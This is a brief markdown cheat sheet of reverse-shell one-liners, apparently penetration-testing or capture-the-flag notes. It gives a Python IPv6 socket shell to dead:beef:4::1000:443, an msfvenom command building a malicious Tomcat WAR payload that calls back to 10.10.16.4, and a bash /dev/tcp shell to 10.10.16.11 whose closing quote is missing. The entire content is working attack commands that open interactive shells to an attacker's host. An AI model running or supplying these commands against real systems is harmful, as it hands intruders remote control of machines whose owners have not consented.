# RevShells

## Python IPv6

```null
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:4::1000",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
```

## Tomcat WAR

```null
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f war -o pwned.war
```

## Bash

```null
bash -c 'bash -i >& /dev/tcp/10.10.16.11/443 0>&1
```

